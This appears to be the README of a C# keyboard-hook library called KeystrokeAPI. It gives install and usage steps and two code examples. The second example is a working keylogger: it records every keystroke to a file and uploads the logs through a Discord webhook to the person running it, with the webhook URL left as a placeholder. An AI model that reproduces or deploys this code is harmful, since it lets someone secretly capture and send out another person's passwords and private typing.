# KeystrokeAPI
A simple Keystroke API written in C# that works for any version of Windows. It abstracts the access to the *win32.dll* and the handling of low level hooks (only keyboard for now). 

## Instalation
```sh
Install-Package KeystrokeAPI
```
## How to use

**1 -** Call the *CreateKeyboardHook()* method passing your callback like this:

```c#
api.CreateKeyboardHook((character) => { Console.Write(character); });
```
**2 -** Implement your own "*Windows Message Loop*" **OR** call this:
```c#
Application.Run();
```
*NOTE: This call starts the windows message loop for you, but you will need to reference the System.Windows.Forms.dll in your project*. [Click here to know why].


## Code Example (using a Console Application) 
```c#
class Program
{
    static void Main(string[] args)
    {
        using (var api = new KeystrokeAPI())
        {
            api.CreateKeyboardHook((character) => { Console.Write(character); });
            Application.Run();
        }
    }
}
```

   [Click here to know why]: <http://stackoverflow.com/a/7460728/890890>

## Code Example 2 (Get logs file through Discord Webhook) 

```c#
using Keystroke.API;
using System;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Keystroke.API.CallbackObjects;
using Keystroke.API.Helpers;

namespace ConsoleApplicationTest
{
	class Program
	{
		static void Main(string[] args)
		{
			// Create Loggin Save Request (1)
			LoggerSaver log = new LoggerSaver();
			// Create your discord url webhook (3)
			LoggerUploader LogUpload = new LoggerUploader("Discord URL WEBHOOK");
			// Subscribe to the event to upload the logs and send them to you (4)
			log.UserTyping += LogUpload.OnUserTyping;
			
			using (var api = new KeystrokeAPI())
			{
				api.CreateKeyboardHook((character) =>
				{
					Console.Write(character);
					// Start saving keystroke (2)
					log.LogDataToFile(character);
				});
				
				Application.Run();
			}
		}
	}
}

```